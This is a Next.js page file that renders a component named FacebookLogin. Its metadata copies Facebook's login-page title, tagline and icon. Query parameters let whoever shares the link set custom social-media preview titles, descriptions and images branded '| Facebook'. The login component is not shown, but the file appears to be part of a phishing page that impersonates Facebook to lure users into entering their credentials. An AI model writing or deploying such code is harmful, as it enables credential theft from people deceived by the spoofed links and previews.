import FacebookLogin from "@/app/facebook-login";
import { Metadata } from "next";

export async function generateMetadata({
  searchParams,
}: {
  searchParams: Promise<{ title: string; desc: string; cover: string }>;
}): Promise<Metadata> {
  const params = await searchParams;
  // const { campaign = "", fundraiserCode = "" } = await searchParams;
  const title = decodeURIComponent(
    params.title ? params.title + " | Facebook" : "Facebook – log in or sign up"
  );
  const description = decodeURIComponent(
    params.desc ||
      "Facebook helps you connect and share with the people in your life."
  );
  const cover = decodeURIComponent(
    params.cover || "https://www.facebook.com/images/fb_icon_325x325.png"
  );

  return {
    title,
    description,
    openGraph: {
      title,
      description,
      images: [{ url: cover, width: 1200, height: 630 }],
      type: "website",
    },
    twitter: {
      card: "summary_large_image",
      title,
      description,
      images: [cover],
    },
  };
}

export default function Page() {
  return <FacebookLogin />;
}
